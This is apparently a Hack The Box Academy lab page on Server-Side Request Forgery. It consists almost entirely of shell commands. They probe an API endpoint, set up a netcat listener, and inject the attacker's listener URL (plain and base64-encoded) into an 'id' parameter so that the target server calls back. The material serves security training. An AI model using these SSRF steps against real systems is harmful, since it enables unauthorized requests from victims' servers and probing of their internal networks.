<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/160/section/1479
// Platform Version: V1
// Module ID: 160
// Module Name: Web Service & API Attacks
// Module Difficulty: Medium
// Section ID: 1479
// Section Title: Server-Side Request Forgery (SSRF)
// Page Title: Hack The Box - Academy
// Page Number: 10
-->

# Server-Side Request Forgery (SSRF)

**Module Name:** Web Service & API Attacks **Page Number:** 10

#### 

#### WEB SERVICE & API ATTACKS

# Server-Side Request Forgery (SSRF)

``` shell-session
ndefstathiou@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

``` shell-session
ndefstathiou@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

``` shell-session
ndefstathiou@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

``` shell-session
ndefstathiou@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
ndefstathiou@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

``` shell-session
ndefstathiou@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

# 

# 

#### Questions

####